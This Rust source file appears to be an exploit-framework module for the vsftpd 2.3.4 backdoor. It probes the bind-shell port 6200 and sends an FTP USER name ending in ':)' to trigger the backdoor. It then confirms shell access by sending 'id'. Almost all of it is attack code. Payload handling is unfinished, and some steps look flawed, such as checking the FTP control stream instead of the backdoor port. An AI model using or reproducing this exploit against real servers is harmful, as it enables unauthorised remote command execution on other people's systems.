use crate::{
    core::exploit::{remote_tcp::RemoteTcp, Exploit, Info, Kind, Ranking},
    util::gen::random_alphanumeric,
};
use log::info;
use std::{
    error::Error,
    io::{Read, Write},
    net::TcpStream,
};

struct Vsftpd234Backdoor {
    remote_tcp: RemoteTcp,
    backdoor_port: Option<String>,
}

impl Vsftpd234Backdoor {
    // TODO: When exploit is being used by CLI interaction, can get RHOST and RPORT there and pass it in
    fn new(remote_tcp: RemoteTcp, backdoor_port: Option<String>) -> Vsftpd234Backdoor {
        Vsftpd234Backdoor {
            remote_tcp,
            backdoor_port,
        }
    }

    fn handle_backdoor(&self, mut stream: TcpStream) -> Result<(), Box<dyn Error>> {
        stream.write("id\n".as_bytes())?;

        let mut backdoor_resp = String::new();
        stream.read_to_string(&mut backdoor_resp)?;

        if !backdoor_resp.contains("uid=") {
            return Err("The backdoor port seems to not be a shell".into());
        }
        info!("Received backdoor UID response: {}", backdoor_resp.trim());

        // TODO: handle payload now
        Ok(())
    }
}

impl Exploit for Vsftpd234Backdoor {
    fn kind() -> Kind {
        Kind::Remote
    }

    fn ranking() -> Ranking {
        Ranking::Excellent
    }

    fn info() -> Info {
        Info {
            name: "VSFTPD v2.3.4 Backdoor Command Execution".to_string(),
            description:
                "This module exploits a malicious backdoor that was added to the	VSFTPD download \
        archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between \
        June 30th 2011 and July 1st 2011 according to the most recent information \
        available. This backdoor was removed on July 3rd 2011."
                    .to_string(),
            license: None,
            author: Some(vec!["hdm".to_string(), "MC".to_string()]),
            references: None,
            platform: Some(vec!["unix".to_string()]),
        }
    }

    fn exploit(&self) -> Result<(), Box<dyn std::error::Error>> {
        let backdoor_port = match &self.backdoor_port {
            Some(backdoor_port) => backdoor_port,
            None => "6200",
        };
        info!("Attempting to access backdoor on port {}", backdoor_port);
        match self
            .remote_tcp
            .custom_connect(&self.remote_tcp.rhost, backdoor_port)
        {
            Ok(stream) => {
                info!(
                    "Port {} used by the backdoor bind listener is already open",
                    backdoor_port
                );
                self.handle_backdoor(stream)?;
            }
            Err(e) => info!(
                "Port {} used by backdoor bind listener is not already open: {}",
                backdoor_port, e
            ),
        };

        let mut stream = self.remote_tcp.connect()?;

        let mut banner_resp = String::new();
        stream.read_to_string(&mut banner_resp)?;
        info!("Banner returned from server: {}", banner_resp);

        let user_hash = random_alphanumeric(6);
        stream.write(format!("USER {}:)\r\n", user_hash).as_bytes())?;
        let mut user_hash_resp = String::new();
        stream.read_to_string(&mut user_hash_resp)?;
        info!("Response to user hash: {}", user_hash_resp);

        if user_hash_resp.contains("530") {
            return Err(
                "Server is configured for anonymous only and the backdoor code cannot be reached"
                    .into(),
            );
        }

        if !user_hash_resp.contains("331") {
            return Err(
                "Server is not responding as expected, response should contain 331 code".into(),
            );
        }

        stream.write(format!("PASS {}\r\n", user_hash).as_bytes())?;
        // Server responds here, not necessary to check as backdoor port should now be open

        self.handle_backdoor(stream)?;
        Ok(())
    }
}
